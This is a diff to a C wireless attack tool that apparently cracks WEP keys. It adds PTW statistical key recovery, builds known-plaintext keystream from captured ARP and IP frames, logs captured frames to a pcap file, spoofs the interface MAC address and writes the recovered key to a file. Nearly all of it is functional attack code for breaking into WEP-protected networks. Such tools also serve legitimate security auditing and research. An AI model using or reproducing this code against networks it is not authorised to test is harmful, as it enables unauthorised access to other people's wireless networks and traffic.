@@ -43,6 +43,9 @@
 #include <signal.h>
 #include <stdarg.h>
 #include <err.h>
+#include <pcap.h>
+
+#include "aircrack-ptw-lib.h"
 
 #define FIND_VICTIM		0
 #define FOUND_VICTIM		1
@@ -104,11 +107,15 @@ struct wep_log {
 	unsigned char iv[3];
 } weplog;
 
+#define LINKTYPE_IEEE802_11     105
+#define TCPDUMP_MAGIC           0xA1B2C3D4
+
 unsigned char* floodip = 0;
 unsigned short floodport = 6969;
 unsigned short floodsport = 53;
 
 unsigned char* netip = 0;
+int netip_arg = 0;
 
 unsigned char* rtrmac = 0;
 
@@ -118,6 +125,8 @@ unsigned char myip[16] = "192.168.0.123";
 int bits = 0;
 int ttl_val = 0;
 
+PTW_attackstate *ptw;
+
 unsigned char *victim_mac = 0;
 
 int ack_timeout = 100*1000;
@@ -125,10 +134,14 @@ int ack_timeout = 100*1000;
 #define ARPLEN (8+ 8 + 20)
 unsigned char arp_clear[] = "\xAA\xAA\x03\x00\x00\x00\x08\x06";
 unsigned char ip_clear[] =  "\xAA\xAA\x03\x00\x00\x00\x08\x00";
+#define S_LLC_SNAP      "\xAA\xAA\x03\x00\x00\x00"
+#define S_LLC_SNAP_ARP  (S_LLC_SNAP "\x08\x06")
+#define S_LLC_SNAP_IP   (S_LLC_SNAP "\x08\x00")
 
 #define MCAST_PREF "\x01\x00\x5e\x00\x00"
 
-#define WEP_FILE "wep.log"
+#define WEP_FILE "wep.cap"
+#define KEY_FILE "key.log"
 #define PRGA_FILE "prga.log"
 
 unsigned int min_prga =  128;
@@ -141,12 +154,14 @@ unsigned int min_prga =  128;
  */
 #define CRACK_LOCAL_CMD "../aircrack/aircrack"
 #define CRACK_INSTALL_CMD "/usr/local/bin/aircrack"
-int thresh_incr = 100000;
+
+#define INCR 30000
+int thresh_incr = INCR;
 
 #define MAGIC_TTL_PAD 69
 
 int crack_dur = 60;
-int wep_thresh = 100000;
+int wep_thresh = INCR;
 int crack_pid = 0;
 struct timeval crack_start;
 struct timeval real_start;
@@ -248,7 +263,7 @@ void check_key() {
 	int rd;
 	struct timeval now;
 
-	fd = open("key.log", O_RDONLY);
+	fd = open(KEY_FILE, O_RDONLY);
 
 	if (fd == -1) {
 		return;
@@ -320,6 +335,31 @@ void set_chan(int c) {
 	chaninfo.chan = c;
 }
 
+void set_if_mac(unsigned char* mac, unsigned char *name) {
+	int s;
+	struct ifreq ifr;
+	
+	s = socket(PF_INET, SOCK_DGRAM, 0);
+	if (s == -1) {
+		perror("socket()");
+		exit(1);
+	}
+
+	memset(&ifr, 0, sizeof(ifr));
+	strcpy(ifr.ifr_name, name);
+
+	ifr.ifr_addr.sa_family = AF_LINK;
+	ifr.ifr_addr.sa_len = 6;
+	memcpy(ifr.ifr_addr.sa_data, mac, 6);
+
+	if (ioctl(s, SIOCSIFLLADDR, &ifr) == -1) {
+		perror("ioctl(SIOCSIFLLADDR)");
+		exit(1);
+	}
+
+	close(s);
+}
+
 void setup_if(char *dev) {
 	int s;
 	struct ifreq ifr;
@@ -334,6 +374,8 @@ void setup_if(char *dev) {
 
 	time_print("Setting up %s... ", dev);
 	fflush(stdout);
+	
+	set_if_mac(mymac, dev);
 
 	s = socket(PF_INET, SOCK_DGRAM, 0);
 	if (s == -1) {
@@ -516,7 +558,7 @@ void send_frame(int tx, unsigned char* buf, int len) {
 			time_print("ERROR Max retransmists for (%d bytes):\n", 
 			       lastlen);
 			hexdump(&lame[0], lastlen);
-			exit(1);
+//			exit(1);
 		}
 		len = lastlen;
 //		printf("Warning doing a retransmit...\n");
@@ -752,28 +794,8 @@ int get_victim_ssid(struct ieee80211_frame* wh, int len) {
 	return 0;
 }
 
-// XXX: acks don't work for now... too slow!
 void send_ack(int tx) {
-	unsigned char buf[64];
-	struct ieee80211_frame* wh;
-
-	return;
-
-	wh = (struct ieee80211_frame*) &buf[0];
-
-	memset(buf, 0, sizeof(buf));
-        wh->i_fc[0] |= IEEE80211_FC0_TYPE_CTL | IEEE80211_FC0_SUBTYPE_ACK;
-	memcpy(wh->i_addr1, victim.bss, 6);
-
-	inject(tx, buf, 10);
-#if 0
-	{
-	struct timeval tv;
-	gettimeofday(&tv, NULL);
-
-	printf("sent ack %lu.%lu\n", tv.tv_sec, tv.tv_usec);
-	}
-#endif	
+	/* firmware acks */
 }
 
 void do_llc(unsigned char* buf, unsigned short type) {
@@ -1209,26 +1231,28 @@ void decrypt_arpreq(struct ieee80211_frame* wh, int rd) {
 	time_print("Got ARP request from (%s)\n", mac2str(wh->i_addr3));
 }
 
-void log_wep(unsigned char* body, int len) {
-	unsigned char log[5];
+void log_wep(struct ieee80211_frame* wh, int len) {
 	int rd;
+	struct pcap_pkthdr pkh;
+	struct timeval tv;
+	unsigned char *body = (unsigned char*) (wh+1);
 
-	if (body[3] != 0) {
-		time_print("Key index=%x!!\n", body[3]);
-		exit(1);
-	}
+	memset(&pkh, 0, sizeof(pkh));
+	pkh.caplen = pkh.len = len;
+	if (gettimeofday(&tv, NULL) == -1)
+		err(1, "gettimeofday()");
+	pkh.ts = tv;
+	if (write(weplog.fd, &pkh, sizeof(pkh)) != sizeof(pkh))
+		err(1, "write()");
 
-	memcpy(log, body, 3);
-	memcpy(&log[3], &body[4], 2);
-
-	rd = write(weplog.fd, log, sizeof(log));
+	rd = write(weplog.fd, wh, len);
 
 	if (rd == -1) {
 		perror("write()");
 		exit(1);
 	}
-	if (rd != sizeof(log)) {
-		time_print("short write %d out of %d\n", rd, sizeof(log));
+	if (rd != len) {
+		time_print("short write %d out of %d\n", rd, len);
 		exit(1);
 	}
 
@@ -1337,10 +1361,107 @@ void try_dictionary(struct ieee80211_frame* wh, int len) {
 	}
 }
 
+int is_arp(struct ieee80211_frame *wh, int len)
+{       
+        int arpsize = 8 + sizeof(struct arphdr) + 10*2;
+
+        if (len == arpsize || len == 54)
+                return 1;
+
+        return 0;
+}
+
+void *get_sa(struct ieee80211_frame *wh)
+{       
+        if (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
+                return wh->i_addr3;
+        else    
+                return wh->i_addr2;
+}
+
+void *get_da(struct ieee80211_frame *wh)
+{       
+        if (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
+                return wh->i_addr1;
+        else    
+                return wh->i_addr3;
+}
+
+int known_clear(void *clear, struct ieee80211_frame *wh, int len)
+{       
+        unsigned char *ptr = clear;
+
+        /* IP */
+        if (!is_arp(wh, len)) {
+                unsigned short iplen = htons(len - 8);
+                            
+//                printf("Assuming IP %d\n", len);
+                            
+                len = sizeof(S_LLC_SNAP_IP) - 1;
+                memcpy(ptr, S_LLC_SNAP_IP, len);
+                ptr += len;
+#if 1                  
+                len = 2;    
+                memcpy(ptr, "\x45\x00", len);
+                ptr += len;
+                            
+                memcpy(ptr, &iplen, len);
+                ptr += len;
+#endif
+                len = ptr - ((unsigned char*)clear);
+                return len;
+        }
+//        printf("Assuming ARP %d\n", len);
+
+        /* arp */
+        len = sizeof(S_LLC_SNAP_ARP) - 1;
+        memcpy(ptr, S_LLC_SNAP_ARP, len);
+        ptr += len;
+
+        /* arp hdr */
+        len = 6;
+        memcpy(ptr, "\x00\x01\x08\x00\x06\x04", len);
+        ptr += len;
+
+        /* type of arp */
+        len = 2;
+        if (memcmp(get_da(wh), "\xff\xff\xff\xff\xff\xff", 6) == 0)
+                memcpy(ptr, "\x00\x01", len);
+        else   
+                memcpy(ptr, "\x00\x02", len);
+        ptr += len;
+
+        /* src mac */
+        len = 6;
+        memcpy(ptr, get_sa(wh), len);
+        ptr += len;
+
+        len = ptr - ((unsigned char*)clear);
+        return len;
+}
+
+void add_keystream(struct ieee80211_frame* wh, int rd)
+{
+	unsigned char clear[1024];
+	int dlen = rd - sizeof(struct ieee80211_frame) - 4 - 4;
+	int clearsize;
+	unsigned char *body = (unsigned char*) (wh+1);
+	int i;
+	
+	clearsize = known_clear(clear, wh, dlen);
+	if (clearsize < 16)
+		return;
+
+	for (i = 0; i < 16; i++)
+		clear[i] ^= body[4+i];
+
+	PTW_addsession(ptw, body, clear);
+}
+
 void got_wep(struct ieee80211_frame* wh, int rd) {
 	int bodylen;
 	int dlen;
-	unsigned char *clear;
+	unsigned char clear[1024];
 	int clearsize;
 	unsigned char *body;
 
@@ -1355,7 +1476,12 @@ void got_wep(struct ieee80211_frame* wh, int rd) {
 	     ( (wh->i_fc[1] & IEEE80211_FC1_DIR_TODS) &&
 	        memcmp(wh->i_addr2, mymac, 6) != 0) ) {
 
-		log_wep(body, dlen + 8);
+		if (body[3] != 0) {
+			time_print("Key index=%x!!\n", body[3]);
+			exit(1);
+		}
+		log_wep(wh, rd);
+		add_keystream(wh, rd);
 	
 		// try to decrypt too
 		try_dictionary(wh, rd);
@@ -1445,17 +1571,8 @@ void got_wep(struct ieee80211_frame* wh, int rd) {
 		return;
 	}
 
-
-	time_print("Datalen=%d Assuming: ", dlen);
-	if (dlen == ARPLEN || dlen == PADDED_ARPLEN) {
-		clear = arp_clear;
-		clearsize = sizeof(arp_clear) - 1;
-		printf("ARP\n");
-	} else {
-		clear = ip_clear;
-		clearsize = sizeof(ip_clear) - 1;
-		printf("IP\n");
-	}	
+	clearsize = known_clear(clear, wh, dlen);
+	time_print("Datalen %d Known clear %d\n", dlen, clearsize);
 
 	set_prga(body, &body[4], clear, clearsize);
 }
@@ -1495,58 +1612,12 @@ void stuff_for_net(struct ieee80211_frame* wh, int rd) {
 }
 
 void anal(unsigned char* buf, int rd, int tx) { // yze
-#define BIT(n)  (1<<(n))
-	struct bpf_hdr* bpfh = (struct bpf_hdr*) buf;
-	struct ieee80211_radiotap_header* rth;
-	struct ieee80211_frame* wh;
+	struct ieee80211_frame* wh = (struct ieee80211_frame *) buf;
 	int type,stype;
 	static int lastseq = -1;
 	int seq;
 	unsigned short *seqptr;
 	int for_us = 0;
-	uint32_t present;
-	uint8_t rflags; 
-
-	// BPF
-	rd -= bpfh->bh_hdrlen;
-	if (bpfh->bh_caplen != bpfh->bh_datalen) {
-		time_print("Warning: caplen=%d datalen=%d\n",
-		       bpfh->bh_caplen, bpfh->bh_datalen);
-	}
-
-	if (rd != bpfh->bh_caplen) {
-#if 0	
-	// XXX
-		printf("Error: rd=%d caplen=%d\n", rd, bpfh->bh_caplen);
-		hexdump(buf, rd+bpfh->bh_hdrlen);
-//		exit(1);
-		return;
-#endif
-		// XXX what's going on
-		assert( rd > bpfh->bh_caplen);
-		rd = bpfh->bh_caplen;
-	}
-
-	// RADIOTAP
-	rth = (struct ieee80211_radiotap_header*) 
-	      ((unsigned char*) bpfh + bpfh->bh_hdrlen);
-        /* check if FCS/CRC is included in packet */
-	present = le32toh(rth->it_present);
-	if (present & BIT(IEEE80211_RADIOTAP_FLAGS)) {
-		if (present & BIT(IEEE80211_RADIOTAP_TSFT))
-			rflags = ((const uint8_t *)rth)[8];
-		else
-			rflags = ((const uint8_t *)rth)[0];
-	} else  
-		rflags = 0;
-	/* 802.11 CRC */
-	if (rflags & IEEE80211_RADIOTAP_F_FCS)
-		rd -= IEEE80211_CRC_LEN;
-
-	// 802.11
-	wh = (struct ieee80211_frame*)
-	     ((unsigned char*)rth + rth->it_len);
-	rd -= rth->it_len;
 
 	if (rd < 1) {
 		time_print("rd=%d\n", rd);
@@ -1606,7 +1677,6 @@ void anal(unsigned char* buf, int rd, int tx) { // yze
 			stuff_for_net(wh, rd);
 		}
 	}
-#undef BIT
 }
 
 void do_arp(unsigned char* buf, unsigned short op,
@@ -1990,13 +2060,15 @@ void can_write(int tx) {
 				char* ptr;
 
 				strcpy(arp_ip, netip);
-				ptr = strchr(arp_ip, '.');
-				assert(ptr);
-				ptr = strchr(++ptr, '.');
-				assert(ptr);
-				ptr = strchr(++ptr, '.');
-				assert(ptr);
-				strcpy(++ptr, "1");
+				if (!netip_arg) {
+					ptr = strchr(arp_ip, '.');
+					assert(ptr);
+					ptr = strchr(++ptr, '.');
+					assert(ptr);
+					ptr = strchr(++ptr, '.');
+					assert(ptr);
+					strcpy(++ptr, "1");
+				}
 
 				if (gettimeofday(&arpsend, NULL) == -1)
 					err(1, "gettimeofday()");
@@ -2030,6 +2102,51 @@ void can_write(int tx) {
 	}
 }
 
+void save_key(unsigned char *key, int len)
+{
+	char tmp[16];
+	char k[32];
+	int fd;
+	int rd;
+
+	k[0] = 0;
+	while (len--) {
+		sprintf(tmp, "%.2X", *key++);
+		strcat(k, tmp);
+		if (len)
+			strcat(k, ":");
+	}
+
+	fd = open(KEY_FILE, O_WRONLY | O_CREAT | 0644);
+	if (fd == -1)
+		err(1, "open()");
+
+	printf("\nKey: %s\n", k);
+	rd = write(fd, k, strlen(k));
+	if (rd == -1)
+		err(1, "write()");
+	if (rd != strlen(k))
+		errx(1, "write %d/%d\n", rd, strlen(k));
+	close(fd);
+}
+
+#define KEYLIMIT (1000000)
+int do_crack(void)
+{
+	unsigned char key[PTW_KEYHSBYTES];
+
+	if(PTW_computeKey(ptw, key, 13, KEYLIMIT) == 1) {
+		save_key(key, 13);
+		return 1;
+	}
+	if(PTW_computeKey(ptw, key, 5, KEYLIMIT/10) == 1) {
+		save_key(key, 5);
+		return 1;
+	}
+
+	return 0;
+}
+
 void try_crack() {
 	if (crack_pid) {
 		printf("\n");
@@ -2049,35 +2166,8 @@ void try_crack() {
 
 	// child
 	if (crack_pid == 0) {
-		char bitz[16];
-		char* args[] = { "aircrack", "wep.log", NULL };
-		char* argb[] = { "aircrack", "-n", bitz, "wep.log", NULL };
-		char* envp[] = { NULL };
-		char **arg;
-
-#if 1
-		if (setsid() == -1)
-			err(1, "setsid");
-#endif
-
-		close (1);
-		close (2);
-
-		if (bits > 0) {
-			snprintf(bitz, sizeof(bitz)-1, "%d", bits);
-			arg = argb;
-		}
-		else
-			arg = args;
-
-		/* NB: try local copy first; then installed dir */
-		if (execve(CRACK_LOCAL_CMD, arg, envp) == -1) {
-			if (errno != ENOENT)
-				err(1, "execve(%s)", CRACK_LOCAL_CMD); 
-			if (execve(CRACK_INSTALL_CMD, arg, envp) == -1)
-				err(1, "execve(%s)", CRACK_INSTALL_CMD); 
-		}
-
+		if (!do_crack())
+			printf("\nCrack unsuccessful\n");
 		exit(1);
 	} 
 
@@ -2152,32 +2242,6 @@ void open_tap() {
 
 	close(s);
 	time_print("Opened tap device: %s\n", tapdev);
-}
-
-void set_tap_mac(unsigned char* mac) {
-	int s;
-	struct ifreq ifr;
-	
-	s = socket(PF_INET, SOCK_DGRAM, 0);
-	if (s == -1) {
-		perror("socket()");
-		exit(1);
-	}
-
-	memset(&ifr, 0, sizeof(ifr));
-	strcpy(ifr.ifr_name, tapdev);
-
-	ifr.ifr_addr.sa_family = AF_LINK;
-	ifr.ifr_addr.sa_len = 6;
-	memcpy(ifr.ifr_addr.sa_data, mac, 6);
-
-	if (ioctl(s, SIOCSIFLLADDR, &ifr) == -1) {
-		perror("ioctl(SIOCSIFLLADDR)");
-		exit(1);
-	}
-
-	close(s);
-	time_print("Set tap MAC to: %s\n", mac2str(mac));
 }
 
 void read_tap() {
@@ -2258,6 +2322,95 @@ int elapsedd(struct timeval *past, struct timeval *now)
         return el;
 }       
 
+static unsigned char *get_80211(unsigned char **data, int *totlen, int *plen)
+{             
+#define BIT(n)  (1<<(n))
+        struct bpf_hdr *bpfh;
+        struct ieee80211_radiotap_header *rth;
+        uint32_t present;
+        uint8_t rflags;
+        void *ptr;
+	static int nocrc = 0;
+        
+	assert(*totlen);
+           
+        /* bpf hdr */
+        bpfh = (struct bpf_hdr*) (*data);
+        assert(bpfh->bh_caplen == bpfh->bh_datalen); /* XXX */
+        *totlen -= bpfh->bh_hdrlen;
+        
+        /* check if more packets */
+        if ((int)bpfh->bh_caplen < *totlen) {
+                int tot = bpfh->bh_hdrlen + bpfh->bh_caplen;
+                int offset = BPF_WORDALIGN(tot);
+                
+                *data = (char*)bpfh + offset;
+                *totlen -= offset - tot; /* take into account align bytes */
+        } else if ((int)bpfh->bh_caplen > *totlen)
+                abort();
+
+        *plen = bpfh->bh_caplen;
+        *totlen -= bpfh->bh_caplen;
+        assert(*totlen >= 0);
+
+        /* radiotap */
+        rth = (struct ieee80211_radiotap_header*)
+              ((char*)bpfh + bpfh->bh_hdrlen);
+        /* XXX cache; drivers won't change this per-packet */
+        /* check if FCS/CRC is included in packet */
+        present = le32toh(rth->it_present);
+        if (present & BIT(IEEE80211_RADIOTAP_FLAGS)) {
+                if (present & BIT(IEEE80211_RADIOTAP_TSFT))
+                        rflags = ((const uint8_t *)rth)[8];
+                else    
+                        rflags = ((const uint8_t *)rth)[0];
+        } else  
+                rflags = 0;
+        *plen -= rth->it_len;
+        assert(*plen > 0);
+
+        /* 802.11 CRC */
+        if (nocrc || (rflags & IEEE80211_RADIOTAP_F_FCS)) {
+                *plen -= IEEE80211_CRC_LEN;
+                nocrc = 1;
+        }
+        
+        ptr = (char*)rth + rth->it_len;
+
+        return ptr;
+#undef BIT
+}
+
+static int read_packet(int fd, unsigned char *dst, int len)
+{
+	static unsigned char buf[4096];
+	static int totlen = 0;
+	static unsigned char *next = buf;
+        unsigned char *pkt;
+        int plen;
+        
+        assert(len > 0);
+
+        /* need to read more */
+        if (totlen == 0) {
+                totlen = read(fd, buf, sizeof(buf));
+                if (totlen == -1) {
+                        totlen = 0;
+                        return -1;
+                }
+                next = buf;
+        }
+        
+        /* read 802.11 packet */
+        pkt = get_80211(&next, &totlen, &plen);
+        if (plen > len)
+                plen = len;
+        assert(plen > 0);
+        memcpy(dst, pkt, plen);
+
+        return plen;
+}
+
 void own(int wifd) {
 	unsigned char buf[4096];
 	int rd;
@@ -2275,8 +2428,23 @@ void own(int wifd) {
 
 	weplog.fd = open(WEP_FILE, O_WRONLY | O_APPEND);
 	if (weplog.fd == -1) {
+		struct pcap_file_header pfh;
+
+		memset(&pfh, 0, sizeof(pfh));
+		pfh.magic           = TCPDUMP_MAGIC;
+		pfh.version_major   = PCAP_VERSION_MAJOR;
+		pfh.version_minor   = PCAP_VERSION_MINOR;
+		pfh.thiszone        = 0;
+		pfh.sigfigs         = 0;
+		pfh.snaplen         = 65535;
+		pfh.linktype        = LINKTYPE_IEEE802_11;
+		
 		weplog.fd = open(WEP_FILE, O_WRONLY | O_CREAT,
 				 S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
+		if (weplog.fd != -1) {
+			if (write(weplog.fd, &pfh, sizeof(pfh)) != sizeof(pfh))
+				err(1, "write()");
+		}
 	}
 	else {
 		time_print("WARNING: Appending in %s\n", WEP_FILE);
@@ -2314,7 +2482,8 @@ void own(int wifd) {
 		close(fd);
 
 	open_tap();
-	set_tap_mac(mymac);
+	set_if_mac(mymac, tapdev);
+	time_print("Set tap MAC to: %s\n", mac2str(mymac));
 
 	if (tapfd > wifd)
 		largest = tapfd;
@@ -2444,7 +2613,7 @@ void own(int wifd) {
 		if (rd != 0) {
 			// wifi
 			if (FD_ISSET(wifd, &rfd)) {
-				rd = read(wifd, buf, sizeof(buf));
+				rd = read_packet(wifd, buf, sizeof(buf));
 				if (rd == 0)
 					return;
 				if (rd == -1) {
@@ -2524,6 +2693,10 @@ void start(char *dev) {
 	setup_if(dev);
 
 	fd = open_bpf(dev, DLT_IEEE802_11_RADIO);
+
+	ptw = PTW_newattackstate();
+	if (!ptw)
+		err(1, "PTW_newattackstate()");
 
 	own(fd);
 
@@ -2621,6 +2794,7 @@ int main(int argc, char *argv[]) {
 
 			case 'n':
 				netip = optarg;
+				netip_arg = 1;
 				break;
 
 			case 'r':
